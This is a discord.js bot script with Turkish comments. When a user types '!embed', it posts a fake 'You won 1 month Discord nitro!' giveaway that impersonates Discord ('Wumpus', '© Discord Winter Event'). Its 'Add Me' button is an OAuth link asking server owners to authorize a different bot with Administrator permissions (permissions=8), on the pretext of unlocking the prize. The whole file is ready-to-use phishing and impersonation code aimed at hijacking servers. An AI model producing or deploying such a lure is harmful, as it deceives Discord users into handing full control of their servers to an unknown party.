const { Client, Intents, MessageEmbed, MessageActionRow, MessageButton } = require('discord.js');
const client = new Client({
    intents: [
        Intents.FLAGS.GUILDS,
        Intents.FLAGS.GUILD_MESSAGES,
        Intents.FLAGS.MESSAGE_CONTENT,
        Intents.FLAGS.GUILD_MEMBERS,
    ],
});

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;

    if (message.content === '!embed') {
        // Embed mesajını oluşturuyoruz
        const embed = new MessageEmbed()
            .setTitle('<a:Verify_Blue:1355135777499119636>  | Redeem your 1 month of Discord Nitro!')
            .setDescription('<a:loading:1347282841695813715>   | Hey there! I\'m **Wumpus**, a Discord Bot gifting awesome free prizes such as **Discord Nitro subscription** for adding me to your server!\n\n> <:WhiteGift:1347326372615422094> | To be able to receive your prize, you must follow the requirements below!\n\n> `1.` Click **Add me** to your server\n> `2.` Server must have at least `10+ members` & **have an activity**\n> `3.` After finished your **gift link** will be sent via **DMs** shortly!')
            .setColor('5b5bff')
            .setFooter("© Discord Winter Event")
            .setThumbnail("https://cdn.discordapp.com/attachments/1347149052009123865/1347244192786681917/1268867386576994347.gif?ex=67cb1e6e&is=67c9ccee&hm=26fafcdc9e5de1f0849a4cbdf515698caca31135c9d4308b17ba2247a25f4d66&")
            .setImage("https://cdn.discordapp.com/attachments/1368387394977665047/1369314795697864734/9fc497df3f1a3d1df2f39d045a009e7d.png?ex=681b6947&is=681a17c7&hm=8405dfcec9ea5430d3feb5ae307ddcc84db7788252de679a257e1a40dedae35b&");

        // Buton oluşturuyoruz
        const button = new MessageButton()
            .setLabel('Add Me')
	    .setEmoji('1364075075598417952')
            .setStyle('LINK')
            .setURL('https://discord.com/oauth2/authorize?client_id=1245686536054247446&permissions=8&integration_type=0&scope=bot');

        // Butonu içeren bir satır (row) oluşturuyoruz
        const row = new MessageActionRow().addComponents(button);

        try {
            // Embed ve butonları kanala gönderiyoruz
            await message.channel.send({
                content: `**You won 1 month Discord nitro!**`,
                embeds: [embed],
                components: [row],
            });
            console.log('Embed with button sent!');
        } catch (error) {
            console.error('Error sending embed with button:', error);
            message.reply('There was an error sending the embed with the button.');
        }
    }
});


client.login('');  // Buraya botunuzun token'ını girin
